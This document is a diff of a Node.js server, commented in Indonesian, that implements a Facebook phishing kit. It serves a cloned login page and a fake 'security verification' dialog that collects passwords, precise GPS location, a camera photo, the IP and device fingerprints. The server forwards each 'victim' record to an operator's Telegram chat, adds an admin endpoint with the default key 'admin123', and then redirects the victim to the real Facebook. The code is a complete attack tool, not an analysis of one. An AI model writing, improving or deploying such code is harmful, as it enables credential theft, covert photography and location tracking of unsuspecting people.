@@ -1,214 +1,484 @@
 const express = require('express');
-const https = require('https');
-const fs = require('fs');
 const TelegramBot = require('node-telegram-bot-api');
 const geoip = require('geoip-lite');
-const app = express();
-const port = 3000;
+const fs = require('fs');
+const path = require('path');
 
-// Konfigurasi Telegram Bot
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Konfigurasi dari environment variables
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';
+
+// Inisialisasi bot jika token tersedia
+let bot = null;
+if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
+    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+}
+
+// Database sederhana (gunakan database nyata untuk production)
+const victims = new Map();
 
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Database in-memory (gunakan MongoDB/PostgreSQL untuk production)
-let victims = new Map();
+// Helper function untuk generate victim ID
+function generateVictimId(req) {
+    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const userAgent = req.headers['user-agent'] || '';
+    const crypto = require('crypto');
+    return crypto
+        .createHash('md5')
+        .update(ip + userAgent + Date.now())
+        .digest('hex')
+        .substring(0, 12);
+}
 
 // Route utama - Halaman phishing
 app.get('/', (req, res) => {
     const victimId = generateVictimId(req);
-    res.send(`
+    
+    const html = `
     <!DOCTYPE html>
     <html>
     <head>
         <title>Facebook - Login</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
-            body { font-family: Arial; background: #f0f2f5; }
+            body { 
+                font-family: Arial, sans-serif; 
+                background: #f0f2f5;
+                margin: 0;
+                padding: 0;
+                min-height: 100vh;
+            }
+            .container {
+                max-width: 1200px;
+                margin: 0 auto;
+                padding: 20px;
+            }
+            .header {
+                text-align: center;
+                padding: 40px 0;
+            }
+            .header h1 {
+                color: #1877f2;
+                font-size: 48px;
+                margin: 0;
+                font-weight: bold;
+            }
+            .main-content {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 60vh;
+            }
             .login-box { 
                 background: white; 
-                padding: 20px; 
+                padding: 30px; 
                 width: 400px; 
-                margin: 100px auto; 
                 border-radius: 8px; 
                 box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             }
-            input { width: 100%; padding: 10px; margin: 10px 0; }
-            button { background: #1877f2; color: white; padding: 12px; width: 100%; border: none; }
+            .login-box h2 {
+                color: #1c1e21;
+                margin-bottom: 20px;
+                text-align: center;
+            }
+            .form-group {
+                margin-bottom: 15px;
+            }
+            .form-group input {
+                width: 100%;
+                padding: 14px 16px;
+                border: 1px solid #dddfe2;
+                border-radius: 6px;
+                font-size: 17px;
+                box-sizing: border-box;
+            }
+            .form-group input:focus {
+                outline: none;
+                border-color: #1877f2;
+                box-shadow: 0 0 0 2px #e7f3ff;
+            }
+            .login-btn {
+                background: #1877f2;
+                color: white;
+                border: none;
+                padding: 14px;
+                width: 100%;
+                border-radius: 6px;
+                font-size: 20px;
+                font-weight: bold;
+                cursor: pointer;
+                margin-top: 10px;
+            }
+            .login-btn:hover {
+                background: #166fe5;
+            }
+            .divider {
+                display: flex;
+                align-items: center;
+                margin: 20px 0;
+                color: #8a8d91;
+            }
+            .divider:before,
+            .divider:after {
+                content: "";
+                flex: 1;
+                height: 1px;
+                background: #dadde1;
+            }
+            .divider span {
+                padding: 0 15px;
+            }
+            .create-account-btn {
+                background: #42b72a;
+                color: white;
+                border: none;
+                padding: 14px;
+                width: 60%;
+                border-radius: 6px;
+                font-size: 17px;
+                font-weight: bold;
+                cursor: pointer;
+                display: block;
+                margin: 20px auto;
+            }
+            .footer {
+                text-align: center;
+                padding: 20px;
+                color: #8a8d91;
+                font-size: 14px;
+                border-top: 1px solid #dadde1;
+                margin-top: 40px;
+            }
+            /* Modal styles */
+            .modal {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.8);
+                z-index: 1000;
+            }
+            .modal-content {
+                background: white;
+                width: 90%;
+                max-width: 500px;
+                margin: 50px auto;
+                padding: 30px;
+                border-radius: 10px;
+                position: relative;
+            }
+            .close-btn {
+                position: absolute;
+                top: 15px;
+                right: 15px;
+                background: none;
+                border: none;
+                font-size: 24px;
+                cursor: pointer;
+                color: #8a8d91;
+            }
+            .permission-item {
+                margin: 15px 0;
+                padding: 15px;
+                background: #f0f2f5;
+                border-radius: 6px;
+            }
+            .camera-container {
+                width: 100%;
+                height: 300px;
+                background: #000;
+                margin: 20px 0;
+                border-radius: 6px;
+                overflow: hidden;
+            }
+            .camera-container video {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+            }
         </style>
     </head>
     <body>
-        <div class="login-box">
-            <h2>Facebook Login</h2>
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="Email or Phone">
-                <input type="password" id="password" placeholder="Password">
-                <button type="submit">Login</button>
-            </form>
+        <div class="container">
+            <div class="header">
+                <h1>facebook</h1>
+            </div>
+            
+            <div class="main-content">
+                <div class="login-box">
+                    <h2>Masuk ke Facebook</h2>
+                    <form id="loginForm">
+                        <div class="form-group">
+                            <input type="text" id="username" placeholder="Email atau nomor telepon" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="password" id="password" placeholder="Kata sandi" required>
+                        </div>
+                        <button type="submit" class="login-btn">Masuk</button>
+                        
+                        <div class="divider">
+                            <span>atau</span>
+                        </div>
+                        
+                        <a href="#" style="display: block; text-align: center; color: #1877f2; text-decoration: none; margin: 15px 0;">
+                            Lupa kata sandi?
+                        </a>
+                        
+                        <button type="button" class="create-account-btn" onclick="showSignup()">
+                            Buat Akun Baru
+                        </button>
+                    </form>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>Bahasa Indonesia • English (UK) • 日本語 • 한국어 • 中文(简体)</p>
+                <p>© 2024 Facebook</p>
+            </div>
         </div>
         
-        <!-- Permissions Modal -->
-        <div id="permissionModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8);">
-            <div style="background:white; width:500px; margin:100px auto; padding:30px; border-radius:10px;">
-                <h2>Security Verification Required</h2>
-                <p>For your account security, we need to verify your identity.</p>
-                <p>Please allow the following permissions:</p>
-                <div style="margin:20px 0;">
-                    <input type="checkbox" id="locationPerm"> Allow location access<br>
-                    <input type="checkbox" id="cameraPerm"> Allow camera access for face verification<br>
-                    <input type="checkbox" id="micPerm"> Allow microphone access (optional)
+        <!-- Permission Modal -->
+        <div id="permissionModal" class="modal">
+            <div class="modal-content">
+                <button class="close-btn" onclick="closeModal('permissionModal')">×</button>
+                <h2 style="color: #1c1e21; margin-bottom: 20px;">Verifikasi Keamanan Diperlukan</h2>
+                <p>Untuk melindungi akun Anda, kami perlu memverifikasi identitas Anda.</p>
+                
+                <div class="permission-item">
+                    <input type="checkbox" id="locationPerm" checked disabled>
+                    <label for="locationPerm" style="margin-left: 10px;">
+                        <strong>📍 Izinkan Akses Lokasi</strong><br>
+                        <small>Untuk mendeteksi aktivitas mencurigakan</small>
+                    </label>
                 </div>
-                <button onclick="requestPermissions()" style="background:#42b72a; color:white; padding:12px 30px; border:none; border-radius:5px;">
-                    Continue Verification
+                
+                <div class="permission-item">
+                    <input type="checkbox" id="cameraPerm">
+                    <label for="cameraPerm" style="margin-left: 10px;">
+                        <strong>📸 Verifikasi Wajah</strong><br>
+                        <small>Ambil foto untuk konfirmasi identitas</small>
+                    </label>
+                </div>
+                
+                <div id="cameraSection" style="display: none;">
+                    <div class="camera-container">
+                        <video id="cameraVideo" autoplay playsinline></video>
+                    </div>
+                    <button onclick="capturePhoto()" style="
+                        background: #1877f2;
+                        color: white;
+                        border: none;
+                        padding: 12px 24px;
+                        border-radius: 6px;
+                        cursor: pointer;
+                        margin-right: 10px;
+                    ">
+                        📸 Ambil Foto
+                    </button>
+                    <button onclick="skipCamera()" style="
+                        background: #8a8d91;
+                        color: white;
+                        border: none;
+                        padding: 12px 24px;
+                        border-radius: 6px;
+                        cursor: pointer;
+                    ">
+                        Lewati
+                    </button>
+                </div>
+                
+                <button onclick="requestPermissions()" style="
+                    background: #42b72a;
+                    color: white;
+                    border: none;
+                    padding: 14px;
+                    width: 100%;
+                    border-radius: 6px;
+                    font-size: 17px;
+                    font-weight: bold;
+                    cursor: pointer;
+                    margin-top: 20px;
+                ">
+                    Lanjutkan Verifikasi
                 </button>
-                <p style="font-size:12px; color:#666; margin-top:20px;">
-                    This helps prevent unauthorized access to your account.
+                
+                <p style="font-size: 12px; color: #8a8d91; margin-top: 15px;">
+                    Informasi ini hanya digunakan untuk keamanan akun Anda.
                 </p>
             </div>
         </div>
         
-        <!-- Camera Modal -->
-        <div id="cameraModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9);">
-            <div style="background:white; width:600px; margin:50px auto; padding:20px; border-radius:10px; text-align:center;">
-                <h2>Face Verification</h2>
-                <p>Please look at the camera and press "Capture"</p>
-                <video id="camera" autoplay style="width:100%; height:400px; background:#000;"></video>
-                <canvas id="canvas" style="display:none;"></canvas>
-                <div style="margin:20px 0;">
-                    <button onclick="capturePhoto()" style="background:#1877f2; color:white; padding:12px 30px; border:none; border-radius:5px; margin-right:10px;">
-                        📸 Capture Photo
-                    </button>
-                    <button onclick="skipCamera()" style="background:#ccc; color:black; padding:12px 30px; border:none; border-radius:5px;">
-                        Skip
-                    </button>
-                </div>
+        <!-- Loading Modal -->
+        <div id="loadingModal" class="modal">
+            <div class="modal-content" style="text-align: center;">
+                <h2>Memproses...</h2>
+                <div style="
+                    width: 50px;
+                    height: 50px;
+                    border: 4px solid #f3f3f3;
+                    border-top: 4px solid #1877f2;
+                    border-radius: 50%;
+                    animation: spin 1s linear infinite;
+                    margin: 30px auto;
+                "></div>
+                <p>Sedang memverifikasi informasi Anda...</p>
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                </style>
             </div>
         </div>
-        
+
         <script>
             const victimId = '${victimId}';
+            let cameraStream = null;
+            let userLocation = null;
+            let userPhoto = null;
             
-            // Handle form submission
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Form submission handler
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
-                document.getElementById('permissionModal').style.display = 'block';
-            });
-            
-            function requestPermissions() {
-                if(!document.getElementById('locationPerm').checked) {
-                    alert('Location permission is required for security verification.');
+                
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                if (!username || !password) {
+                    alert('Harap isi semua field');
                     return;
                 }
                 
-                // Request location
-                if(navigator.geolocation) {
+                // Show permission modal
+                document.getElementById('permissionModal').style.display = 'block';
+            });
+            
+            // Toggle camera section
+            document.getElementById('cameraPerm').addEventListener('change', function() {
+                const cameraSection = document.getElementById('cameraSection');
+                cameraSection.style.display = this.checked ? 'block' : 'none';
+                
+                if (this.checked) {
+                    startCamera();
+                } else {
+                    stopCamera();
+                }
+            });
+            
+            // Start camera
+            async function startCamera() {
+                try {
+                    cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        } 
+                    });
+                    document.getElementById('cameraVideo').srcObject = cameraStream;
+                } catch (err) {
+                    console.error('Camera error:', err);
+                    document.getElementById('cameraPerm').checked = false;
+                    document.getElementById('cameraSection').style.display = 'none';
+                    alert('Akses kamera ditolak. Verifikasi akan dilanjutkan tanpa foto.');
+                }
+            }
+            
+            // Stop camera
+            function stopCamera() {
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                    cameraStream = null;
+                }
+            }
+            
+            // Capture photo
+            function capturePhoto() {
+                const video = document.getElementById('cameraVideo');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                userPhoto = canvas.toDataURL('image/jpeg', 0.7);
+                alert('Foto berhasil diambil!');
+                stopCamera();
+            }
+            
+            // Skip camera
+            function skipCamera() {
+                stopCamera();
+                document.getElementById('cameraPerm').checked = false;
+                document.getElementById('cameraSection').style.display = 'none';
+            }
+            
+            // Request permissions
+            function requestPermissions() {
+                document.getElementById('loadingModal').style.display = 'block';
+                
+                // Get location
+                if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const location = {
+                        async (position) => {
+                            userLocation = {
                                 lat: position.coords.latitude,
                                 lon: position.coords.longitude,
                                 accuracy: position.coords.accuracy
                             };
                             
-                            // Store location
-                            localStorage.setItem('userLocation', JSON.stringify(location));
-                            
-                            // Request camera if selected
-                            if(document.getElementById('cameraPerm').checked) {
-                                document.getElementById('permissionModal').style.display = 'none';
-                                startCamera();
-                            } else {
-                                completeTracking();
-                            }
+                            await collectAndSendData();
                         },
-                        (error) => {
-                            alert('Location access denied. Please enable location services.');
+                        async (error) => {
+                            console.warn('Location error:', error);
+                            await collectAndSendData();
                         },
-                        { enableHighAccuracy: true, timeout: 10000 }
+                        { 
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
                     );
+                } else {
+                    collectAndSendData();
                 }
             }
             
-            function startCamera() {
-                document.getElementById('cameraModal').style.display = 'block';
-                const video = document.getElementById('camera');
-                
-                navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                })
-                .then(stream => {
-                    video.srcObject = stream;
-                    window.cameraStream = stream;
-                })
-                .catch(err => {
-                    console.error('Camera error:', err);
-                    alert('Camera access denied. Continuing without face verification.');
-                    completeTracking();
-                });
-            }
-            
-            function capturePhoto() {
-                const video = document.getElementById('camera');
-                const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
-                
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Convert to base64
-                const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // Stop camera
-                if(window.cameraStream) {
-                    window.cameraStream.getTracks().forEach(track => track.stop());
-                }
-                
-                // Store photo
-                localStorage.setItem('userPhoto', photoData);
-                
-                // Complete tracking
-                completeTracking();
-            }
-            
-            function skipCamera() {
-                if(window.cameraStream) {
-                    window.cameraStream.getTracks().forEach(track => track.stop());
-                }
-                document.getElementById('cameraModal').style.display = 'none';
-                completeTracking();
-            }
-            
-            async function completeTracking() {
-                // Collect all data
+            // Collect and send data
+            async function collectAndSendData() {
                 const username = document.getElementById('username').value;
                 const password = document.getElementById('password').value;
-                const location = JSON.parse(localStorage.getItem('userLocation') || '{}');
-                const photo = localStorage.getItem('userPhoto');
                 
-                // Get additional system info
+                // Get IP address
+                let ip = '';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip;
+                } catch (e) {
+                    ip = 'Unknown';
+                }
+                
+                // Get system info
                 const systemInfo = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${window.screen.width}x${window.screen.height}`,
+                    languages: navigator.languages,
+                    screen: window.screen.width + 'x' + window.screen.height,
+                    colorDepth: window.screen.colorDepth,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     cookies: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack
+                    doNotTrack: navigator.doNotTrack || 'unspecified'
                 };
-                
-                // Get IP via external service
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
                 
                 // Get network info
                 const connection = navigator.connection || {};
@@ -219,263 +489,235 @@ app.get('/', (req, res) => {
                     saveData: connection.saveData
                 };
                 
-                // Prepare final data
+                // Get browser plugins
+                const plugins = [];
+                if (navigator.plugins) {
+                    for (let i = 0; i < navigator.plugins.length; i++) {
+                        plugins.push(navigator.plugins[i].name);
+                    }
+                }
+                
+                // Prepare tracking data
                 const trackingData = {
                     victimId: victimId,
-                    credentials: { username, password },
-                    location: location,
-                    photo: photo,
-                    ip: ipData.ip,
+                    credentials: {
+                        username: username,
+                        password: password
+                    },
+                    location: userLocation,
+                    photo: userPhoto,
+                    ip: ip,
                     system: systemInfo,
                     network: networkInfo,
+                    plugins: plugins,
                     timestamp: new Date().toISOString(),
-                    url: window.location.href
+                    url: window.location.href,
+                    referrer: document.referrer
                 };
                 
                 // Send to server
-                fetch('/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(trackingData)
-                })
-                .then(response => {
-                    // Redirect to real Facebook
-                    window.location.href = 'https://facebook.com';
-                })
-                .catch(error => {
+                try {
+                    const response = await fetch('/track', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(trackingData)
+                    });
+                    
+                    if (response.ok) {
+                        // Redirect to real Facebook after 2 seconds
+                        setTimeout(() => {
+                            window.location.href = 'https://www.facebook.com';
+                        }, 2000);
+                    } else {
+                        throw new Error('Server error');
+                    }
+                } catch (error) {
                     console.error('Error:', error);
-                    window.location.href = 'https://facebook.com';
-                });
+                    window.location.href = 'https://www.facebook.com';
+                }
             }
+            
+            // Modal functions
+            function closeModal(modalId) {
+                document.getElementById(modalId).style.display = 'none';
+                stopCamera();
+            }
+            
+            function showSignup() {
+                alert('Halaman pendaftaran sedang dalam pemeliharaan.');
+            }
+            
+            // Cleanup camera on page unload
+            window.addEventListener('beforeunload', () => {
+                stopCamera();
+            });
         </script>
     </body>
     </html>
-    `);
-});
-
-// Endpoint untuk menerima data tracking
-app.post('/track', (req, res) => {
-    const trackingData = req.body;
-    
-    // Analisis IP untuk mendapatkan info lengkap
-    const geo = geoip.lookup(trackingData.ip);
-    trackingData.geoInfo = geo || {};
-    
-    // Simpan ke database
-    victims.set(trackingData.victimId, trackingData);
-    
-    // Kirim ke Telegram
-    sendToTelegram(trackingData);
-    
-    // Simpan ke file
-    saveToFile(trackingData);
-    
-    res.json({ success: true });
-});
-
-// Endpoint untuk melihat semua korban
-app.get('/victims', (req, res) => {
-    res.json(Array.from(victims.values()));
-});
-
-// Endpoint untuk melihat korban spesifik
-app.get('/victim/:id', (req, res) => {
-    const victim = victims.get(req.params.id);
-    if (victim) {
-        res.json(victim);
-    } else {
-        res.status(404).json({ error: 'Victim not found' });
-    }
-});
-
-// Fungsi untuk mengirim ke Telegram
-function sendToTelegram(data) {
-    const message = `
-    🚨 **NEW VICTIM TRACKED** 🚨
-
-    **📱 Credentials:**
-    👤 Username: ${data.credentials.username}
-    🔑 Password: ${data.credentials.password}
-
-    **📍 Location:**
-    🌐 IP: ${data.ip}
-    🗺️ Country: ${data.geoInfo.country || 'Unknown'}
-    🏙️ City: ${data.geoInfo.city || 'Unknown'}
-    📍 Coordinates: ${data.location.lat || 'N/A'}, ${data.location.lon || 'N/A'}
-    🎯 Accuracy: ${data.location.accuracy || 'N/A'} meters
-
-    **🖥️ System Info:**
-    🔍 User Agent: ${data.system.userAgent}
-    💻 Platform: ${data.system.platform}
-    🖥️ Screen: ${data.system.screen}
-    🕐 Timezone: ${data.system.timezone}
-
-    **🌐 Network:**
-    📶 Connection: ${data.network.effectiveType || 'Unknown'}
-    ⚡ Speed: ${data.network.downlink || 'Unknown'} Mbps
-
-    **⏰ Timestamp:** ${new Date(data.timestamp).toLocaleString()}
-
-    **🔗 URL:** ${data.url}
     `;
-
-    // Kirim teks
-    bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
-
-    // Kirim lokasi di peta jika ada
-    if (data.location.lat && data.location.lon) {
-        bot.sendLocation(TELEGRAM_CHAT_ID, data.location.lat, data.location.lon);
-    }
-
-    // Kirim foto jika ada
-    if (data.photo) {
-        // Konversi base64 ke buffer
-        const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
-        const buffer = Buffer.from(base64Data, 'base64');
-        
-        // Simpan temporary file
-        const filename = `victim_${data.victimId}_${Date.now()}.jpg`;
-        fs.writeFileSync(filename, buffer);
-        
-        // Kirim foto
-        bot.sendPhoto(TELEGRAM_CHAT_ID, filename);
-        
-        // Hapus file temporary
-        fs.unlinkSync(filename);
-    }
-
-    // Kirim link Google Maps
-    if (data.location.lat && data.location.lon) {
-        const mapsUrl = `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
-        bot.sendMessage(TELEGRAM_CHAT_ID, `🗺️ Google Maps: ${mapsUrl}`);
-    }
-}
-
-// Fungsi untuk menyimpan ke file
-function saveToFile(data) {
-    const logDir = './logs';
-    if (!fs.existsSync(logDir)) {
-        fs.mkdirSync(logDir, { recursive: true });
-    }
-
-    const filename = `${logDir}/victim_${data.victimId}_${Date.now()}.json`;
-    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
     
-    // Juga tambah ke log utama
-    const masterLog = `${logDir}/master_log.json`;
-    let logs = [];
-    if (fs.existsSync(masterLog)) {
-        logs = JSON.parse(fs.readFileSync(masterLog));
-    }
-    logs.push(data);
-    fs.writeFileSync(masterLog, JSON.stringify(logs, null, 2));
-}
-
-// Fungsi generate victim ID
-function generateVictimId(req) {
-    const ip = req.ip || req.connection.remoteAddress;
-    const userAgent = req.headers['user-agent'];
-    return require('crypto')
-        .createHash('md5')
-        .update(ip + userAgent + Date.now())
-        .digest('hex')
-        .substring(0, 12);
-}
-
-// Bot Telegram commands
-bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, `
-    🕵️ **Tracking Bot Active** 🕵️
-    
-    Commands:
-    /victims - List all tracked victims
-    /victim [id] - Get specific victim details
-    /stats - Show tracking statistics
-    /clear - Clear all data (admin only)
-    
-    New victims will be automatically reported here.
-    `);
+    res.send(html);
 });
 
-bot.onText(/\/victims/, (msg) => {
-    const victimList = Array.from(victims.values())
-        .map((v, i) => `${i+1}. ${v.credentials.username} (${v.ip}) - ${new Date(v.timestamp).toLocaleString()}`)
-        .join('\n');
-    
-    bot.sendMessage(msg.chat.id, `👥 **Tracked Victims:**\n\n${victimList || 'No victims yet'}`);
+// API endpoint untuk menerima data tracking
+app.post('/track', async (req, res) => {
+    try {
+        const trackingData = req.body;
+        
+        // Add geo IP information
+        const geoInfo = geoip.lookup(trackingData.ip);
+        trackingData.geoInfo = geoInfo || {};
+        
+        // Store in memory
+        victims.set(trackingData.victimId, trackingData);
+        
+        // Save to file (for Vercel, use temporary storage)
+        saveToLog(trackingData);
+        
+        // Send to Telegram if bot is configured
+        if (bot && TELEGRAM_CHAT_ID) {
+            await sendToTelegram(trackingData);
+        }
+        
+        res.json({ 
+            success: true, 
+            message: 'Data received',
+            redirect: 'https://www.facebook.com'
+        });
+        
+    } catch (error) {
+        console.error('Error processing tracking data:', error);
+        res.status(500).json({ 
+            success: false, 
+            error: 'Internal server error' 
+        });
+    }
 });
 
-bot.onText(/\/victim (.+)/, (msg, match) => {
-    const victimId = match[1];
-    const victim = victims.get(victimId);
+// Endpoint untuk melihat semua data (protected)
+app.get('/admin/victims', (req, res) => {
+    const adminKey = req.query.key;
+    const validKey = process.env.ADMIN_KEY || 'admin123';
     
-    if (victim) {
-        const details = `
-        🔍 **Victim Details:**
+    if (adminKey !== validKey) {
+        return res.status(403).json({ error: 'Unauthorized' });
+    }
+    
+    const victimsArray = Array.from(victims.values());
+    res.json({
+        count: victimsArray.length,
+        victims: victimsArray
+    });
+});
+
+// Endpoint untuk menghapus data
+app.delete('/admin/victims', (req, res) => {
+    const adminKey = req.query.key;
+    const validKey = process.env.ADMIN_KEY || 'admin123';
+    
+    if (adminKey !== validKey) {
+        return res.status(403).json({ error: 'Unauthorized' });
+    }
+    
+    victims.clear();
+    res.json({ success: true, message: 'All data cleared' });
+});
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+    res.json({ 
+        status: 'healthy',
+        victimsCount: victims.size,
+        timestamp: new Date().toISOString()
+    });
+});
+
+// Function to save log
+function saveToLog(data) {
+    const logEntry = {
+        timestamp: new Date().toISOString(),
+        victimId: data.victimId,
+        username: data.credentials.username,
+        ip: data.ip,
+        location: data.location
+    };
+    
+    console.log('📱 Tracking Data:', JSON.stringify(logEntry, null, 2));
+    
+    // In Vercel, we can only write to /tmp directory
+    const tmpDir = '/tmp';
+    const logFile = path.join(tmpDir, 'tracking_log.json');
+    
+    try {
+        let logs = [];
+        if (fs.existsSync(logFile)) {
+            const existing = fs.readFileSync(logFile, 'utf8');
+            logs = JSON.parse(existing);
+        }
         
-        ID: ${victim.victimId}
-        Username: ${victim.credentials.username}
-        IP: ${victim.ip}
-        Location: ${victim.location.lat || 'N/A'}, ${victim.location.lon || 'N/A'}
-        Country: ${victim.geoInfo.country || 'Unknown'}
-        Time: ${new Date(victim.timestamp).toLocaleString()}
-        
-        Use /location_${victimId} for maps
-        Use /photo_${victimId} for face photo
+        logs.push(logEntry);
+        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
+    } catch (error) {
+        console.error('Error writing log:', error);
+    }
+}
+
+// Function to send to Telegram
+async function sendToTelegram(data) {
+    try {
+        const message = `
+🚨 *NEW VICTIM TRACKED* 🚨
+
+*📱 Credentials:*
+👤 Username: \`${data.credentials.username}\`
+🔑 Password: \`${data.credentials.password}\`
+
+*📍 Location:*
+🌐 IP: ${data.ip}
+${data.geoInfo.country ? `🗺️ Country: ${data.geoInfo.country}` : ''}
+${data.geoInfo.city ? `🏙️ City: ${data.geoInfo.city}` : ''}
+${data.location ? `📍 Coordinates: ${data.location.lat}, ${data.location.lon}` : ''}
+
+*🖥️ System Info:*
+🔍 Platform: ${data.system.platform}
+🖥️ Screen: ${data.system.screen}
+🌐 Language: ${data.system.languages ? data.system.languages[0] : 'Unknown'}
+
+*⏰ Timestamp:* ${new Date(data.timestamp).toLocaleString()}
         `;
         
-        bot.sendMessage(msg.chat.id, details);
-    } else {
-        bot.sendMessage(msg.chat.id, 'Victim not found.');
-    }
-});
-
-bot.onText(/\/stats/, (msg) => {
-    const stats = {
-        totalVictims: victims.size,
-        countries: {},
-        devices: {},
-        last24h: 0
-    };
-
-    const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
-
-    victims.forEach(victim => {
-        // Count by country
-        const country = victim.geoInfo.country || 'Unknown';
-        stats.countries[country] = (stats.countries[country] || 0) + 1;
+        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
         
-        // Count by device
-        const isMobile = /mobile/i.test(victim.system.userAgent);
-        stats.devices[isMobile ? 'Mobile' : 'Desktop'] = (stats.devices[isMobile ? 'Mobile' : 'Desktop'] || 0) + 1;
-        
-        // Count last 24h
-        if (new Date(victim.timestamp).getTime() > oneDayAgo) {
-            stats.last24h++;
+        // Send location if available
+        if (data.location && data.location.lat && data.location.lon) {
+            await bot.sendLocation(TELEGRAM_CHAT_ID, data.location.lat, data.location.lon);
+            
+            // Send Google Maps link
+            const mapsUrl = `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
+            await bot.sendMessage(TELEGRAM_CHAT_ID, `🗺️ Google Maps: ${mapsUrl}`);
         }
-    });
-
-    const message = `
-    📊 **Tracking Statistics:**
-    
-    👥 Total Victims: ${stats.totalVictims}
-    📈 Last 24 Hours: ${stats.last24h}
-    
-    🌍 By Country:
-    ${Object.entries(stats.countries).map(([c, n]) => `    ${c}: ${n}`).join('\n')}
-    
-    📱 By Device:
-    ${Object.entries(stats.devices).map(([d, n]) => `    ${d}: ${n}`).join('\n')}
-    
-    ⏰ Last Updated: ${new Date().toLocaleString()}
-    `;
-
-    bot.sendMessage(msg.chat.id, message);
-});
+        
+        console.log('✅ Telegram notification sent');
+        
+    } catch (error) {
+        console.error('Error sending to Telegram:', error);
+    }
+}
 
 // Start server
-app.listen(port, () => {
-    console.log(`🕵️ Tracking server running on port ${port}`);
-    console.log(`📱 Telegram bot active`);
-    console.log(`🌐 Access: http://localhost:${port}`);
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🌐 Access: http://localhost:${PORT}`);
+    console.log(`📊 Admin: http://localhost:${PORT}/admin/victims?key=${process.env.ADMIN_KEY || 'admin123'}`);
+    console.log(`❤️ Health: http://localhost:${PORT}/health`);
 });
+
+// Handle graceful shutdown
+process.on('SIGTERM', () => {
+    console.log('SIGTERM received. Shutting down gracefully...');
+    process.exit(0);
+});
+
+module.exports = app;
